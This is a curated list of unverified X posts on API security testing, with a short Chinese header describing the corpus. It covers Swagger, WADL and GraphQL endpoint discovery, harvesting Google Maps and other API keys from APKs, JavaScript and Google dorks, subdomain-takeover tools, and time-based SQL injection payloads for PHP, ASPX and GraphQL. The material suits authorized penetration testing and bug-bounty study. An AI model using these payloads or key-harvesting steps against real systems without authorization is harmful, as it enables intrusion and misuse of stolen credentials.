# X 语料 · API 安全（1）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。仅纯文本，图片与外部媒体已剥离。
作者自述内容，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：本类无专属篇，按 [检测入口](../vuln-detection.md) 选择 · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-exp-api（180 条）、x-residual-api（4 条） · 本文 79 行

- Ran into an API subdomain with an empty response? Try fetching the full API spec from these endpoints:
  /swagger-ui.html
  /swagger/swagger-ui.html
  /api/swagger-ui.html
  /v1.x/swagger-ui.html
  /swagger/index.html
- If Swagger fails, try Jersey's WADL:
  GET /application.wadl
  GET /application.wadl?detail=false
  GET /application.wadl?detail=true
  OPTIONS /api
  OPTIONS /api/v1
  When proxied it may also reveal reachable internal hosts
- When playing with an `API ENDPOINT`, always try to send an `INVALID CONTENT TYPE`; it may end up returning hidden endpoints in the `RESPONSE`
- GraphQL Pentesting: If prod has Introspection Queries disabled make sure to look for dev, test and staging subdomains. Sometimes they are public and have Introspection enabled + check for ?debug=1 functionality enabling stack traces.
- MAP API | Android
  1. Open the apk in Jadx-gui
  2. Go to Resources.arsc > res > values > strings.xml
  3. Here you'll find the Google Map API Key
  4. Open the URL https://maps.googleapis.com/maps/api/staticmap?center=40.714728,-73.998672&zoom=12&size=2500x2000&maptype=roadmap&key={API_Key}
  Map open then report it
- Access to internal company info
  1. Find an internal dev domain using http://whoxy.com
  2. Subdomain enumeration on internal domain
  3. Find internal API subdomain
  4. API key and endpoint in javascript file
  5. Access to internal info
- Site -> Amass -> Waybackurls -> environment.js
  Api key
- when you find an API endpoint like "/api/v4/anything" add "internal" to the route, for example :
  /api/v4/users/<userid> =>> 403
  /api/v4/internal/users/<userid> =>> 200
- echo domain | httpx -silent -extract-regex 'AIza' -mc 200
  Extract google api key maps:
  Verify to api https://github.com/ozguralp/gmapsapiscanner
- google Dorking to find api key
  Eg:- inurl: xsolla "api_key"
- for finding Subdomain takeovers:
  Sign up for http://securitytrails.com and get a free API key to download all the current and historic subdomains.
  Create a domain list then run $ subzy -targets domain_list.txt
- bash one liner to extract graphql embedded queries/mutations from js files.
  cat jsfile.js | nestle -regex '(query|mutation)\s+[a-zA-Z]+[0-9]*[a-zA-Z]+(\([^(\\(|\\))]+\))*\s*[{:nested:}]' | sed 's/\\n/\n/g'
- GraphQL - full schema retrieved via introspection
  Steps-
  1. Copy original graphQL req
  2. Replace with full intro query.
  3. If introspection is enabled, you will get entire schema
- Google Dork - API Docs:
  inurl:apidocs | inurl:api-docs | inurl:swagger | inurl:api-explorer site:"example[.]com"
  Uncover hidden API endpoints
- 7 SQLs
  4 in php
  (select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/
  1 in aspx
  orwa';%20waitfor%20delay%20'0:0:6'%20--%20
  2 in graphql
  orwa') OR 11=(SELECT 11 FROM PG_SLEEP(6))--
- Yup, sometimes you hit /api/api-docs and redirects to a Swagger ep in /api/api-docs/swagger-ui.html or the Swagger ep **IS** api-docs
  Also I've seen:
  /api/swagger --> 302 to -> /
  Then if you append
  /api/swagger/index.html --> 200 OK
  /api/swagger.html --> 200 OK
- How to grab all Graphql query/mutation if introspection disabled?
  1. Download all js files to directory js_files
  2. Run this command:
  grep -Eo '(query|mutation) [a-zA-Z0-9_]+\(' js_files -R
- No Swagger/OpenAPI spec? Find ALL hidden API endpoints directly from JavaScript files:
  1. go install http://github.com/rashahacks/jsmon-cli@latest
  2. Scan the JS URL with -u flag.
  3. Use -query field=apiPaths flag.
  Forget the swagger file — Map the APIs with JS.
